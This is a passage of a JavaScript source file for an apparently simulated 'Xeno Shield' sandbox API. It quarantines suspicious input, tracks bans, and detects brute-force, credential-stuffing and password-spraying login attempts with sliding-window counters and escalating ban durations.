      const a = prev || analyze(next.payload, state.policies.inspection);
      if (next.status === 'released' && a.severity === 'critical' && next.reviewer_note.trim().length < 10) {
        err('/reviewer_note', 'invariant', 'Releasing a critical-severity case needs a reviewer_note of at least 10 characters explaining why.');
      }
      if (next.status === 'confirmed' && a.score === 0) err('/status', 'invariant', 'A case with no detector findings cannot be confirmed as malicious.');
      return errors;
    }

    const caseView = (r) => ({ source: r.source, field: r.field, payload: r.payload, status: r.status, reviewer_note: r.reviewer_note, labels: [...r.labels] });

    function newCaseRecord(v, extra) {
      const a = analyze(v.payload, state.policies.inspection);
      const t = iso();
      return {
        id: newId('qr'), ...v, payload_length: (extra && extra.payload_length) || v.payload.length, ...a,
        fingerprint: (extra && extra.fingerprint) || fingerprintOf(v.source, v.payload),
        hits: 1, version: 1, created_at: t, updated_at: t, last_seen_at: t, deleted_at: null,
      };
    }

    const cases = crud({
      key: 'cases', label: 'case', base: '/v1/quarantine',
      view: caseView, present: presentCase, validate: validateCase, rules: caseRules,
      immutable: ['payload'], transitions: CASE_TRANSITIONS,
      build: (v) => newCaseRecord(v),
      apply: (rec, next) => Object.assign(rec, next),
      unique(next, selfId) {
        const fp = fingerprintOf(next.source, next.payload);
        const clash = Object.values(state.cases).find((r) => !r.deleted_at && r.id !== selfId && r.fingerprint === fp);
        if (clash) throw new ApiError(409, 'duplicate-case', 'Duplicate case', 'This exact payload from this source is already in quarantine.', { conflicting_id: clash.id });
      },
      list: {
        key: 'cases', base: '/v1/quarantine', present: presentCase,
        sortable: ['created_at', 'updated_at', 'score', 'hits', 'source', 'last_seen_at'],
        fieldPaths: Object.keys(presentCase({ id: 'x', source: '', payload: '', labels: [], categories: [], findings: [] })),
        valueOf: (r, k) => r[k],
        parse({ q, csv, num, bad, oneOf }) {
          const status = oneOf('status', CASE_STATUSES);
          const severity = oneOf('severity', ['none', ...SEVERITIES]);
          const category = csv('category');
          const labels = csv('label');
          const minScore = num('min_score', { int: true, min: 0, max: 100 });
          const source = (q.get('source') || '').trim().toLowerCase();
          const text = (q.get('q') || '').trim().toLowerCase();
          return (r) => {
            if (status && !status.includes(r.status)) return false;
            if (severity && !severity.includes(r.severity)) return false;
            if (category && !category.some((c) => r.categories.includes(c) || r.category === c)) return false;
            if (labels && !labels.every((l) => r.labels.includes(l))) return false;
            if (minScore !== undefined && r.score < minScore) return false;
            if (source && r.source.toLowerCase() !== source) return false;
            if (text && ![r.payload, r.source, r.reviewer_note, ...r.labels].some((s) => String(s).toLowerCase().includes(text))) return false;
            return true;
          };
        },
      },
    });

    /* ── bans ── */

    const BAN_WRITABLE = new Set(['kind', 'value', 'scope', 'reason', 'duration_seconds']);
    const BAN_READ_ONLY = new Set(['id', 'object', 'started_at', 'expires_at', 'active', 'created_by', 'strikes', 'hits', 'version', 'created_at', 'updated_at', 'deleted_at', 'links']);

    function validateBan(input) {
      const errors = [];
      const chk = makeCheck(input, errors);
      if (!isObj(input)) return { errors: [{ pointer: '', code: 'type', message: 'Body must be a JSON object.' }] };
      chk.unknown(BAN_WRITABLE, BAN_READ_ONLY);
      const v = {};
      chk.enm('kind', v, BAN_KINDS);
      if (v.kind === 'ip') {
        chk.str('value', v, { required: true, min: 2, max: 45, lower: true });
        if (v.value !== undefined && !validIp(v.value)) { errors.push({ pointer: '/value', code: 'format', message: 'value must be a valid IPv4 or IPv6 address when kind is "ip".' }); delete v.value; }
      } else if (v.kind === 'fingerprint') {
        chk.str('value', v, { required: true, min: 4, max: 128, lower: true, pattern: /^[A-Za-z0-9_:-]+$/, patternMsg: 'a fingerprint may contain letters, digits, _ : - only.' });
      } else {
        chk.str('value', v, { required: true, min: 1, max: 100, lower: true });
      }
      chk.enm('scope', v, BAN_SCOPES, 'all');
      chk.str('reason', v, { required: true, min: 3, max: 200 });
      const d = input.duration_seconds;
      if (d === undefined || d === null) v.duration_seconds = 3600;
      else if (!Number.isInteger(d) || d < 0 || d > MAX_BAN_SECONDS) errors.push({ pointer: '/duration_seconds', code: 'range', message: 'duration_seconds must be an integer from 0 (permanent) to 2,592,000 (30 days).' });
      else v.duration_seconds = d;
      return { value: errors.length ? undefined : v, errors };
    }

    const banView = (r) => ({ kind: r.kind, value: r.value, scope: r.scope, reason: r.reason, duration_seconds: r.duration_seconds });

    function newBanRecord(v, createdBy, strikes) {
      const t = iso();
      return {
        id: newId('ban'), ...v, started_at: t, expires_at: v.duration_seconds ? iso(Date.now() + v.duration_seconds * 1000) : null,
        created_by: createdBy, strikes: strikes || 0, hits: 0, version: 1, created_at: t, updated_at: t, deleted_at: null,
      };
    }

    function banConflict(v, selfId) {
      return Object.values(state.bans).find((b) => b.id !== selfId && banActive(b) && b.kind === v.kind && b.value === v.value && b.scope === v.scope);
    }

    const bans = crud({
      key: 'bans', label: 'ban', base: '/v1/bans',
      view: banView, present: presentBan, validate: validateBan,
      rules(next) {
        const errors = [];
        if (next.duration_seconds === 0 && next.reason.trim().length < 10) {
          errors.push({ pointer: '/reason', code: 'invariant', message: 'A permanent ban (duration_seconds 0) needs a reason of at least 10 characters.' });
        }
        return errors;
      },
      immutable: ['kind', 'value'],
      build: (v) => newBanRecord(v, 'api', 0),
      apply(rec, next) {
        const durationChanged = next.duration_seconds !== rec.duration_seconds;
        Object.assign(rec, next);
        if (durationChanged) rec.started_at = iso();
        rec.expires_at = rec.duration_seconds ? iso(Date.parse(rec.started_at) + rec.duration_seconds * 1000) : null;
      },
      onRestore(rec) {
        rec.started_at = iso();
        rec.expires_at = rec.duration_seconds ? iso(Date.now() + rec.duration_seconds * 1000) : null;
      },
      unique(next, selfId) {
        const clash = banConflict(next, selfId);
        if (clash) throw new ApiError(409, 'duplicate-ban', 'Duplicate ban', `An active ${next.kind} ban for "${next.value}" already covers scope "${next.scope}".`, { conflicting_id: clash.id });
      },
      list: {
        key: 'bans', base: '/v1/bans', present: presentBan,
        sortable: ['created_at', 'updated_at', 'expires_at', 'hits', 'strikes'],
        fieldPaths: Object.keys(presentBan({ id: 'x' })),
        valueOf: (r, k) => (k === 'expires_at' ? r.expires_at || '9999-12-31' : r[k]),
        parse({ q, oneOf, bad }) {
          const kind = oneOf('kind', BAN_KINDS);
          const scope = oneOf('scope', BAN_SCOPES);
          const activeRaw = q.get('active');
          if (activeRaw !== null && activeRaw !== 'true' && activeRaw !== 'false') bad('active', 'active must be "true" or "false".');
          const text = (q.get('q') || '').trim().toLowerCase();
          return (r) => {
            if (kind && !kind.includes(r.kind)) return false;
            if (scope && !scope.includes(r.scope)) return false;
            if (activeRaw !== null && banActive(r) !== (activeRaw === 'true')) return false;
            if (text && ![r.value, r.reason].some((s) => s.toLowerCase().includes(text))) return false;
            return true;
          };
        },
      },
    });

    /* ── guard: abuse detection ── */

    function activeBanFor(kind, value, scope) {
      if (!value) return null;
      return Object.values(state.bans).find((b) => banActive(b) && b.kind === kind && b.value === value && (b.scope === 'all' || b.scope === scope)) || null;
    }

    function issueBan({ kind, value, scope, reason, policy, reqId }) {
      const day = 24 * 3600 * 1000;
      const now = Date.now();
      const strikes = Object.values(state.bans).filter((b) => b.kind === kind && b.value === value && now - Date.parse(b.created_at) < day).length;
      const seconds = Math.min(Math.round(policy.ban_base_seconds * Math.pow(policy.ban_multiplier, strikes)), policy.ban_max_seconds);
      const rec = newBanRecord({ kind, value, scope, reason, duration_seconds: seconds }, 'guard', strikes);
      state.bans[rec.id] = rec;
      record(rec, 'created', reqId, null, 'guard');
      return rec;
    }

    function validateAttempt(input) {
      const errors = [];
      const chk = makeCheck(input, errors);
      if (!isObj(input)) return { errors: [{ pointer: '', code: 'type', message: 'Body must be a JSON object.' }] };
      chk.unknown(new Set(['scope', 'ip', 'identity', 'outcome', 'secret_fingerprint']));
      const v = {};
      chk.enm('scope', v, GUARD_SCOPES);
      chk.str('ip', v, { required: true, min: 2, max: 45, lower: true });
      if (v.ip !== undefined && !validIp(v.ip)) { errors.push({ pointer: '/ip', code: 'format', message: 'ip must be a valid IPv4 or IPv6 address.' }); delete v.ip; }
      chk.str('identity', v, { min: 1, max: 100, lower: true, def: null });
      chk.enm('outcome', v, ['success', 'failure'], 'failure');
      chk.str('secret_fingerprint', v, { min: 4, max: 128, lower: true, def: null, pattern: /^[A-Za-z0-9_:-]+$/, patternMsg: 'secret_fingerprint may contain letters, digits, _ : - only. Send a hash, never a real password.' });
      return { value: errors.length ? undefined : v, errors };
    }

    function banBody(rec) { return rec && { id: rec.id, kind: rec.kind, value: rec.value, scope: rec.scope, reason: rec.reason, expires_at: rec.expires_at }; }

    function decide(decision, extra, status) {
      state.metrics[decision] += 1;
      const headers = {};
      if (extra.retry_after) headers['Retry-After'] = String(extra.retry_after);
      save();
      return { status, headers, body: { decision, ...extra } };
    }

    const guard = {
      attempt(c) {
        const { value: a, errors } = validateAttempt(c.body);
        if (errors.length) throw validationError(errors);
        const policy = state.policies[a.scope];
        const now = Date.now();
        attempts = attempts.filter((e) => now - e.t < 3600 * 1000);

        // 1. an existing ban always wins
        const standing = activeBanFor('ip', a.ip, a.scope) || activeBanFor('identity', a.identity, a.scope) || activeBanFor('fingerprint', a.secret_fingerprint, a.scope);
        if (standing) {
          standing.hits += 1;
          const retry = standing.expires_at ? Math.max(1, Math.ceil((Date.parse(standing.expires_at) - now) / 1000)) : null;
          return decide('block', { scope: a.scope, reason: 'banned', detail: `${standing.kind} "${standing.value}" is banned: ${standing.reason}.`, retry_after: retry, ban: banBody(standing) }, 403);
        }

        // 2. record the event
        attempts.push({ t: now, scope: a.scope, ip: a.ip, identity: a.identity, fp: a.secret_fingerprint, outcome: a.outcome });
        if (a.outcome === 'success') {
          attempts = attempts.filter((e) => !(e.scope === a.scope && e.outcome === 'failure' && e.ip === a.ip && e.identity === a.identity));
          return decide('allow', { scope: a.scope, reason: 'success', remaining: policy.max_failures, retry_after: null, ban: null }, 200);
        }

        // 3. look at the sliding window
        const since = now - policy.window_seconds * 1000;
        const live = attempts.filter((e) => e.scope === a.scope && e.t > since && (policy.counts === 'all' || e.outcome === 'failure'));
        const byIp = live.filter((e) => e.ip === a.ip);
        const ipCount = byIp.length;
        const idCount = a.identity ? live.filter((e) => e.identity === a.identity).length : 0;
        const distinctIds = new Set(byIp.map((e) => e.identity).filter(Boolean)).size;
        const sprayIds = a.secret_fingerprint ? new Set(live.filter((e) => e.fp === a.secret_fingerprint && e.identity).map((e) => e.identity)).size : 0;
        const counters = { ip_attempts: ipCount, identity_attempts: idCount, distinct_identities: distinctIds, fingerprint_identities: sprayIds, window_seconds: policy.window_seconds };

        let hit = null;
        if (a.secret_fingerprint && sprayIds >= policy.spray_threshold) hit = { kind: 'fingerprint', value: a.secret_fingerprint, reason: 'password-spraying' };
        else if (distinctIds >= policy.max_identities) hit = { kind: 'ip', value: a.ip, reason: 'credential-stuffing' };
        else if (ipCount >= policy.max_failures) hit = { kind: 'ip', value: a.ip, reason: distinctIds >= Math.ceil(ipCount * 0.6) && distinctIds >= 3 ? 'credential-stuffing' : 'brute-force' };
        else if (idCount >= policy.max_failures) hit = { kind: 'identity', value: a.identity, reason: 'distributed-brute-force' };

        if (hit) {
          const ban = issueBan({ ...hit, scope: a.scope, policy, reqId: c.reqId });
          const secs = ban.duration_seconds;
          return decide('block', { scope: a.scope, reason: hit.reason, detail: `${hit.kind} "${hit.value}" banned for ${secs}s (strike ${ban.strikes + 1}).`, retry_after: secs, ban: banBody(ban), counters }, 403);
        }

        const worst = Math.max(ipCount, idCount);
        const throttleAt = Math.max(1, Math.ceil(0.6 * policy.max_failures));
        if (worst >= throttleAt) {
          const retry = Math.min(30, Math.pow(2, worst - throttleAt + 1));
          return decide('throttle', { scope: a.scope, reason: 'slow-down', detail: 'Approaching the limit. Back off before the ban lands.', remaining: Math.max(0, policy.max_failures - worst), retry_after: retry, ban: null, counters }, 429);
        }
        return decide('allow', { scope: a.scope, reason: 'within-limits', remaining: policy.max_failures - worst, retry_after: null, ban: null, counters }, 200);
      },

      status(c) {
        const q = c.query;
        const scope = q.get('scope') || 'login';
        if (!GUARD_SCOPES.includes(scope)) throw new ApiError(400, 'invalid-parameter', 'Invalid query parameter', `scope must be one of: ${GUARD_SCOPES.join(', ')}.`, { errors: [{ pointer: '?scope', code: 'enum', message: `scope must be one of: ${GUARD_SCOPES.join(', ')}.` }] });
        const ip = (q.get('ip') || '').toLowerCase() || null;
        const identity = (q.get('identity') || '').toLowerCase() || null;
        const fp = (q.get('fingerprint') || '').toLowerCase() || null;
        if (!ip && !identity && !fp) throw new ApiError(400, 'invalid-parameter', 'Invalid query parameter', 'Provide at least one of ip, identity or fingerprint.');
        const matches = [activeBanFor('ip', ip, scope), activeBanFor('identity', identity, scope), activeBanFor('fingerprint', fp, scope)].filter(Boolean);
        return { status: 200, body: { scope, blocked: matches.length > 0, bans: matches.map(presentBan) } };
      },
    };

    /* ── inspections: the bad-data side ── */

    function inspect(c) {
      const b = c.body;
      const errors = [];
      const chk = makeCheck(isObj(b) ? b : {}, errors);
      if (!isObj(b)) throw validationError([{ pointer: '', code: 'type', message: 'Body must be a JSON object.' }]);
      chk.unknown(new Set(['source', 'fields', 'payload', 'mode']));
      const v = {};
      chk.str('source', v, { required: true, min: 2, max: 40, pattern: /^[\w .:/-]+$/, patternMsg: 'source may contain letters, digits, spaces and . : / _ - only.' });
      chk.enm('mode', v, ['enforce', 'monitor'], 'enforce');
      let entries = [];
      if (b.fields !== undefined && b.payload !== undefined) chk.err('/payload', 'conflict', 'Send either "fields" or "payload", not both.');
      else if (b.fields !== undefined) {
        if (!isObj(b.fields) || !Object.keys(b.fields).length || Object.keys(b.fields).length > 20) chk.err('/fields', 'type', 'fields must be an object with 1–20 entries.');
        else {
          for (const [k, val] of Object.entries(b.fields)) {
            if (!/^[\w.[\]-]{1,40}$/.test(k)) chk.err('/fields/' + k, 'format', 'field names may contain letters, digits and . _ - [ ] only (max 40).');
            else if (typeof val !== 'string' || val.length > 50000) chk.err('/fields/' + k, 'type', 'each field value must be a string of at most 50,000 characters.');
            else entries.push([k, val]);
          }
        }
      } else if (typeof b.payload === 'string' && b.payload.length <= 50000) entries = [[null, b.payload]];
      else chk.err('/payload', 'required', 'Send "fields" (an object of form fields) or "payload" (a string, up to 50,000 characters).');
      if (errors.length) throw validationError(errors);

      const policy = state.policies.inspection;
      const enforce = v.mode === 'enforce';
      let created = null;
      const results = entries.map(([field, text]) => {
        const a = analyze(text, policy);
        const fp = fingerprintOf(v.source, text);
        const existing = Object.values(state.cases).find((r) => !r.deleted_at && r.fingerprint === fp);
        let verdict, reason;
        if (existing && existing.status === 'released') { verdict = 'allow'; reason = 'previously-released'; }
        else if (existing && existing.status === 'confirmed') { verdict = 'quarantine'; reason = 'known-malicious'; }
        else if (existing) { verdict = 'quarantine'; reason = 'already-quarantined'; }
        else if (a.score >= policy.quarantine_score) { verdict = 'quarantine'; reason = 'detector-score'; }
        else { verdict = 'allow'; reason = a.score > 0 ? 'below-threshold' : 'clean'; }

        let caseId = existing ? existing.id : null;
        if (enforce) {
          if (existing) { existing.hits += 1; existing.last_seen_at = iso(); }
          else if (verdict === 'quarantine') {
            const rec = newCaseRecord({ source: v.source, field, payload: text.slice(0, 4000), status: 'quarantined', reviewer_note: '', labels: [] }, { payload_length: text.length, fingerprint: fp });
            state.cases[rec.id] = rec;
            record(rec, 'created', c.reqId, null, 'inspection');
            caseId = rec.id;
            if (!created) created = rec;
          }
        }
        return { field, verdict, reason, score: a.score, severity: a.severity, categories: a.categories, findings: a.findings, case_id: caseId };
      });

      const flagged = results.filter((r) => r.verdict === 'quarantine');
      if (enforce) {
        state.metrics.inspected += results.length;
        state.metrics.quarantined += flagged.length;
        state.metrics.allowed += results.length - flagged.length;
        save();
      }
      const order = ['none', ...SEVERITIES];
      const highest = results.reduce((m, r) => (order.indexOf(r.severity) > order.indexOf(m) ? r.severity : m), 'none');
      return {
        status: created ? 201 : 200,
        headers: created ? { Location: `/v1/quarantine/${created.id}` } : {},
        body: {
          verdict: flagged.length ? 'quarantine' : 'allow', mode: v.mode, source: v.source, threshold: policy.quarantine_score, results,
          summary: { inspected: results.length, quarantined: flagged.length, highest_severity: highest },
        },
      };
    }

    /* ── policies ── */

    function findPolicy(scope) {
      const p = state.policies[scope];
      if (!p) throw new ApiError(404, 'not-found', 'Policy not found', `No policy "${scope}". Available: ${Object.keys(state.policies).join(', ')}.`);
      return p;
    }
    const policyView = (p) => { const { id, scope, object, version, updated_at, ...rest } = p; return rest; };

    /* ── handlers ── */

    const handlers = {
      index() {
        return {
          status: 200,
          body: {
            name: 'Xeno Shield API',
            version: API_VERSION,
            description: 'Quarantines bad data and stops brute-force, stuffing and flood abuse for websites and apps.',
            sandbox: true,
            auth: { scheme: 'Bearer', note: 'Reads are open. Writes need Authorization: Bearer ' + DEMO_TOKEN },
            rate_limit: { capacity: RATE_CAPACITY, refill_per_second: RATE_REFILL_PER_SEC },
            conventions: [
              'POST /inspections to screen user input; suspect fields land in /quarantine.',
              'POST /guard/attempts on every login, signup or API call; the answer is allow (200), throttle (429) or block (403).',
              'Errors are RFC 9457 application/problem+json.',
              'PUT, PATCH and DELETE require If-Match (ETag optimistic concurrency).',
              'PATCH is JSON Merge Patch (RFC 7396).',
              'POST /quarantine and POST /bans honour Idempotency-Key for 24h.',
              'DELETE is a soft delete (410 Gone); POST …/restore reverses it.',
              'Lists use opaque keyset cursors, not offsets.',
            ],
            links: { inspections: '/v1/inspections', quarantine: '/v1/quarantine', guard: '/v1/guard/attempts', bans: '/v1/bans', policies: '/v1/policies', stats: '/v1/stats' },
          },
        };
      },

      inspect,
      'guard.attempt': guard.attempt,
      'guard.status': guard.status,

      'q.list': cases.list, 'q.create': cases.create, 'q.read': cases.read, 'q.replace': cases.replace, 'q.patch': cases.patch,
      'q.remove': cases.remove, 'q.restore': cases.restore, 'q.history': cases.history,
      'b.list': bans.list, 'b.create': bans.create, 'b.read': bans.read, 'b.replace': bans.replace, 'b.patch': bans.patch,
      'b.remove': bans.remove, 'b.restore': bans.restore, 'b.history': bans.history,

      'p.list': () => ({ status: 200, body: { data: Object.values(state.policies).map(presentPolicy) } }),

      'p.read'(c) {
        const p = findPolicy(c.params.scope);
        const tag = etagOf(p);
        const inm = c.req.headers['if-none-match'];
        if (inm && (inm.trim() === '*' || inm.split(',').map((s) => s.trim().replace(/^W\//, '')).includes(tag))) return { status: 304, headers: { ETag: tag } };
        return { status: 200, headers: { ETag: tag }, body: presentPolicy(p) };
      },

      'p.patch'(c) {
        const p = findPolicy(c.params.scope);
        precondition(c.req, p);
        if (!isObj(c.body)) throw validationError([{ pointer: '', code: 'type', message: 'A merge patch must be a JSON object.' }]);
        const { value, errors } = validatePolicy(p.scope, mergePatch(policyView(p), c.body));
        if (errors.length) throw validationError(errors);
        const changes = diff(policyView(p), value);
        if (!Object.keys(changes).length) return { status: 200, headers: { ETag: etagOf(p), 'X-Change': 'none' }, body: presentPolicy(p) };
        Object.assign(p, value);
        p.version += 1;
        p.updated_at = iso();
        record(p, 'updated', c.reqId, changes);
        save();
        return { status: 200, headers: { ETag: etagOf(p) }, body: presentPolicy(p) };
      },

      stats() {
        const cs = Object.values(state.cases).filter((r) => !r.deleted_at);
        const bs = Object.values(state.bans).filter((r) => !r.deleted_at);
        const tally = (arr, fn) => arr.reduce((o, x) => { const k = fn(x); o[k] = (o[k] || 0) + 1; return o; }, {});
        const m = state.metrics;
        return {
          status: 200,
          body: {
            cases: {
              total: cs.length,
              by_status: { quarantined: 0, released: 0, confirmed: 0, ...tally(cs, (r) => r.status) },
              by_severity: tally(cs, (r) => r.severity),
              by_category: tally(cs, (r) => r.category),
              top_sources: Object.entries(tally(cs, (r) => r.source)).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([source, count]) => ({ source, count })),
            },
            bans: { active: bs.filter((r) => banActive(r)).length, by_kind: tally(bs.filter((r) => banActive(r)), (r) => r.kind), total_blocked_attempts: bs.reduce((a, r) => a + r.hits, 0) },
            inspections: { inspected: m.inspected, quarantined: m.quarantined, allowed: m.allowed },
            guard: { allow: m.allow, throttle: m.throttle, block: m.block },
          },
        };
      },

      reset() {
        state = seedState();
        attempts = [];
        save();
        return { status: 200, body: { reset: true, cases: Object.keys(state.cases).length, bans: Object.keys(state.bans).length } };
      },
    };

    /* ── routing ── */

    const ROUTES = [
      ['GET', '/v1', 'index'],
      ['POST', '/v1/inspections', 'inspect', 'json'],
      ['GET', '/v1/quarantine', 'q.list'],
      ['POST', '/v1/quarantine', 'q.create', 'json'],
      ['GET', '/v1/quarantine/:id', 'q.read'],
      ['PUT', '/v1/quarantine/:id', 'q.replace', 'json'],
      ['PATCH', '/v1/quarantine/:id', 'q.patch', 'patch'],
      ['DELETE', '/v1/quarantine/:id', 'q.remove'],
      ['POST', '/v1/quarantine/:id/restore', 'q.restore'],
      ['GET', '/v1/quarantine/:id/history', 'q.history'],
      ['POST', '/v1/guard/attempts', 'guard.attempt', 'json'],
      ['GET', '/v1/guard/status', 'guard.status'],
      ['GET', '/v1/bans', 'b.list'],
      ['POST', '/v1/bans', 'b.create', 'json'],
      ['GET', '/v1/bans/:id', 'b.read'],
      ['PUT', '/v1/bans/:id', 'b.replace', 'json'],
      ['PATCH', '/v1/bans/:id', 'b.patch', 'patch'],
      ['DELETE', '/v1/bans/:id', 'b.remove'],
      ['POST', '/v1/bans/:id/restore', 'b.restore'],
      ['GET', '/v1/bans/:id/history', 'b.history'],
      ['GET', '/v1/policies', 'p.list'],
      ['GET', '/v1/policies/:scope', 'p.read'],
      ['PATCH', '/v1/policies/:scope', 'p.patch', 'patch'],
      ['GET', '/v1/stats', 'stats'],
      ['POST', '/v1/sandbox/reset', 'reset'],
    ].map(([method, pattern, fn, body]) => ({
      method, fn, body,
      re: new RegExp('^' + pattern.replace(/:(\w+)/g, '(?<$1>[^/]+)') + '$'),
    }));

    function parseBody(req, kind) {
      const raw = req.body;
      if (!raw || !raw.trim()) throw new ApiError(400, 'body-required', 'Request body required', 'This operation needs a JSON request body.');
      const ct = (req.headers['content-type'] || '').split(';')[0].trim().toLowerCase();
      const ok = kind === 'patch' ? ['application/json', 'application/merge-patch+json'] : ['application/json'];
      if (!ok.includes(ct)) {
        throw new ApiError(415, 'unsupported-media-type', 'Unsupported media type', `Send Content-Type: ${ok.join(' or ')}${ct ? ` (received "${ct}")` : ''}.`,
          kind === 'patch' ? { headers: { 'Accept-Patch': 'application/merge-patch+json' } } : undefined);
      }
      try { return JSON.parse(raw); } catch (e) { throw new ApiError(400, 'malformed-json', 'Malformed JSON', e.message); }
    }

    function checkAuth(req) {
      const h = req.headers.authorization || '';
      const m = /^Bearer\s+(.+)$/i.exec(h);
      if (!m) throw new ApiError(401, 'unauthorized', 'Authentication required', `Writes need "Authorization: Bearer ${DEMO_TOKEN}".`, { headers: { 'WWW-Authenticate': 'Bearer realm="xeno-shield"' } });
      if (m[1] !== DEMO_TOKEN) throw new ApiError(401, 'invalid-token', 'Invalid token', 'The bearer token was not recognised.', { headers: { 'WWW-Authenticate': 'Bearer realm="xeno-shield", error="invalid_token"' } });
    }

    function dispatch(req, reqId) {
      const path = req.path.replace(/\/+$/, '') || '/';
      const allowed = [];
      let hit = null;
      for (const r of ROUTES) {
        const m = r.re.exec(path);
        if (!m) continue;
        allowed.push(r.method);
        if (r.method === req.method || (req.method === 'HEAD' && r.method === 'GET')) hit = { r, m };
      }
      if (!allowed.length) throw new ApiError(404, 'not-found', 'Route not found', `No route matches ${req.method} ${path}. Try GET /v1.`);
      const allow = [...new Set([...allowed, 'HEAD', 'OPTIONS'])].join(', ');
      if (req.method === 'OPTIONS') return { status: 204, headers: { Allow: allow } };
      if (!hit) throw new ApiError(405, 'method-not-allowed', 'Method not allowed', `${req.method} is not supported here. Allowed: ${allow}.`, { headers: { Allow: allow } });
      if (req.method !== 'GET' && req.method !== 'HEAD') checkAuth(req);
      const body = hit.r.body ? parseBody(req, hit.r.body) : undefined;
      return handlers[hit.r.fn]({ req, params: hit.m.groups || {}, query: req.query, body, reqId });
    }

    /* ── transport ── */

    async function normalize(input, init) {
      init = init || {};
      let url, method = 'GET', headers = new Headers(), body;
      if (typeof Request !== 'undefined' && input instanceof Request) {
        url = input.url; method = input.method; headers = new Headers(input.headers);
        if (!['GET', 'HEAD'].includes(method)) body = await input.clone().text();
      } else {
        url = String(input);
      }
      if (init.method) method = init.method;
      if (init.headers) new Headers(init.headers).forEach((v, k) => headers.set(k, v));
      if (init.body !== undefined && init.body !== null) body = typeof init.body === 'string' ? init.body : String(init.body);
      const u = new URL(url, BASE);
      const h = {};
      headers.forEach((v, k) => { h[k.toLowerCase()] = v; });
      return { method: method.toUpperCase(), path: u.pathname, query: u.searchParams, headers: h, body };
    }

    function take() {
      if (opts.rateLimit === false) return { ok: true, remaining: RATE_CAPACITY, reset: 0 };
      const now = Date.now();
      limiter.tokens = Math.min(RATE_CAPACITY, limiter.tokens + ((now - limiter.t) / 1000) * RATE_REFILL_PER_SEC);
      limiter.t = now;
      if (limiter.tokens < 1) return { ok: false, retry: Math.ceil((1 - limiter.tokens) / RATE_REFILL_PER_SEC), remaining: 0, reset: Math.ceil((RATE_CAPACITY - limiter.tokens) / RATE_REFILL_PER_SEC) };
      limiter.tokens -= 1;
      return { ok: true, remaining: Math.floor(limiter.tokens), reset: Math.ceil((RATE_CAPACITY - limiter.tokens) / RATE_REFILL_PER_SEC) };
    }

    function problemBody(e, req, reqId) {
      if (!(e instanceof ApiError)) e = new ApiError(500, 'internal-error', 'Internal error', 'Something went wrong inside the shield. This one is on us.');
      return {
        status: e.status,
        headers: { ...e.headers, 'Content-Type': 'application/problem+json; charset=utf-8' },
        body: { type: PROBLEM_NS + e.slug, title: e.title, status: e.status, detail: e.detail, instance: req.path, request_id: reqId, ...e.extra },
      };
    }

    async function serviceFetch(input, init) {
      const started = typeof performance !== 'undefined' ? performance.now() : Date.now();
      const req = await normalize(input, init);
      const reqId = 'req_' + rand36(10);
      const rl = take();
      if (latency) await sleep(latency[0] + Math.random() * (latency[1] - latency[0]));

      let res;
      try {
        if (!rl.ok) throw new ApiError(429, 'rate-limited', 'Rate limit exceeded', `The sandbox allows a burst of ${RATE_CAPACITY} requests, refilling at ${RATE_REFILL_PER_SEC}/s. Retry in ${rl.retry}s.`, { headers: { 'Retry-After': String(rl.retry) } });
        res = dispatch(req, reqId);
      } catch (e) {
        if (!(e instanceof ApiError)) console.error('[xeno-api]', e);
        res = problemBody(e, req, reqId);
      }

      const headers = new Headers(res.headers || {});
      const hasBody = res.body !== undefined && res.status !== 204 && res.status !== 304;
      const payload = hasBody ? JSON.stringify(res.body) : null;
      if (hasBody && !headers.has('Content-Type')) headers.set('Content-Type', 'application/json; charset=utf-8');
      if (payload !== null && req.method !== 'HEAD') headers.set('Content-Length', String(new TextEncoder().encode(payload).length));
      headers.set('API-Version', API_VERSION);
      headers.set('X-Request-Id', reqId);
      headers.set('Cache-Control', req.method === 'GET' || req.method === 'HEAD' ? 'private, max-age=0, must-revalidate' : 'no-store');
      headers.set('Vary', 'Accept, Authorization');
      headers.set('RateLimit-Limit', String(RATE_CAPACITY));
      headers.set('RateLimit-Remaining', String(rl.remaining));
      headers.set('RateLimit-Reset', String(rl.reset));
      const elapsed = (typeof performance !== 'undefined' ? performance.now() : Date.now()) - started;
      headers.set('Server-Timing', `app;dur=${elapsed.toFixed(1)}`);

      return new Response(req.method === 'HEAD' ? null : payload, { status: res.status, statusText: STATUS_TEXT[res.status] || '', headers });
    }

    const byCreated = (a, b) => (a.created_at < b.created_at ? 1 : a.created_at > b.created_at ? -1 : 0);

    return {
      fetch: serviceFetch,
      /** Direct, rate-limit-free reads (used by the demo UI to draw itself). */
      peekCases() { return Object.values(state.cases).sort(byCreated).map((r) => ({ ...presentCase(r), etag: etagOf(r) })); },
      peekBans() { return Object.values(state.bans).sort(byCreated).map((r) => ({ ...presentBan(r), etag: etagOf(r) })); },
      reset() { handlers.reset(); },
    };
  }

  return {
    version: API_VERSION,
    base: BASE,
    demoToken: DEMO_TOKEN,
    createService,
    service: null, // populated below in browsers
  };
});

if (typeof window !== 'undefined' && window.XenoAPI && !window.XenoAPI.service) {
  window.XenoAPI.service = window.XenoAPI.createService();
  window.xeno = window.XenoAPI.service; // `xeno.fetch('/v1/quarantine')` from the devtools console
}
